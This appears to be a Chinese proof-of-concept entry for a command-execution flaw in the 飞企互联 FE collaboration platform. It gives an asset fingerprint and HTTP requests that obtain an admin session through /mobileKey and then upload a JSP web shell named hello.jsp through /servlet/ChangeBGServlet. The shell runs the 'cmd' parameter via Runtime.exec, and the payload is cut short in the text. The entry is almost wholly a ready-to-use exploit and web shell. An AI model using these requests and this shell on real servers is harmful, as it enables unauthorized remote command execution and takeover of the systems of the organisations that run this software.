# 飞企互联OAChangeBGServlet存在命令执行漏洞

- **系统**：飞企互联　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="FE-协作平台"`
- **请求**：`POST /mobileKey HTTP/1.1`

**请求体 / payload**
```
获取session
Host:
Content-Type: application/x-www-form-urlencoded
userName=admin
文件上传
POST /servlet/ChangeBGServlet HTTP/1.1
Host:
Cookie: SESSION=ZWRmNDZlNWUtMjJhZC00YTFjLWE5ODYtYTc5NmZjZjY4MWVi
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykfbdARYXJdNxq686
------WebKitFormBoundarykfbdARYXJdNxq686
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: text/plain
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.print…（脚本共 924 字，完整版见原文）
```
- **预期**：200　|　—